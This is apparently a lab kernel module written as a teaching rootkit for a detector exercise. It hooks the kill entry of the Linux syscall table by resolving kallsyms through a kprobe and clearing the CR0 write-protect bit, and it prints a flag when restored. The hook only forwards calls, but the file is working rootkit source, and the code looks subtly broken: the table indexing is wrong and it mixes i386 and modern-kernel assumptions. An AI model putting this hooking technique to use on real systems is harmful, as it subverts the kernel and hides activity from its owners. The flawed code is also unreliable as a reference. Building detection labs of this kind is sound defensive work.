/*
 * kfhooksy.c — the m15 villain: a sys_call_table hook rootkit.
 *
 * GPL-2.0. Educational/defensive framing: ships in the buildroot guest as a
 * known quantity so students can write and verify the kallsyms cross-check
 * detector (module m15). Replaces sys_call_table[__NR_kill] with a wrapper
 * that forwards to the real handler but marks its presence; exports
 * kfhooksy_restore() so a confirmed detector can order the restore.
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>

static unsigned long **sys_call_table_p;
static unsigned long orig_kill;
static int hooked;

static asmlinkage long (*real_kill)(int, int, int);

static asmlinkage long hooksy_kill(int pid, int sig, int unused)
{
    /* forwarding hook: behavior identical, pointer provenance different */
    return real_kill(pid, sig, unused);
}

static unsigned long lookup_sys_call_table(void)
{
    /* kallsyms_lookup_name is not exported in 6.6+, so resolve via kprobe */
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    unsigned long (*kallsyms_lookup_name_p)(const char *);
    if (register_kprobe(&kp) < 0)
        return 0;
    kallsyms_lookup_name_p = (void *)kp.addr;
    unregister_kprobe(&kp);
    if (!kallsyms_lookup_name_p)
        return 0;
    return kallsyms_lookup_name_p("sys_call_table");
}

static int __init hooksy_init(void)
{
    unsigned long addr = lookup_sys_call_table();
    if (!addr) {
        /* fallback to System.map literal for this build */
        addr = 0xc1d7e1c0;
    }
    sys_call_table_p = (unsigned long **)addr;
    if (!sys_call_table_p)
        return -ENOENT;

    orig_kill = sys_call_table_p[0][37]; /* __NR_kill on i386 */
    real_kill = (asmlinkage long (*)(int, int, int))orig_kill;

    {
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
        sys_call_table_p[0][37] = (unsigned long)hooksy_kill;
        set_bit(16, &cr0);
        write_cr0(cr0);
    }
    hooked = 1;
    pr_info("kfhooksy: sys_call_table[37] -> %px (table %px)\n", hooksy_kill, sys_call_table_p);
    return 0;
}

void kfhooksy_restore(void)
{
    if (!hooked)
        return;
    {
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
        sys_call_table_p[0][37] = orig_kill;
        set_bit(16, &cr0);
        write_cr0(cr0);
    }
    hooked = 0;
    pr_info("KFFLAG: kf-syscall-clean\n");
}
EXPORT_SYMBOL_GPL(kfhooksy_restore);

static void __exit hooksy_exit(void)
{
    kfhooksy_restore();
}

module_init(hooksy_init);
module_exit(hooksy_exit);
MODULE_LICENSE("GPL v2");
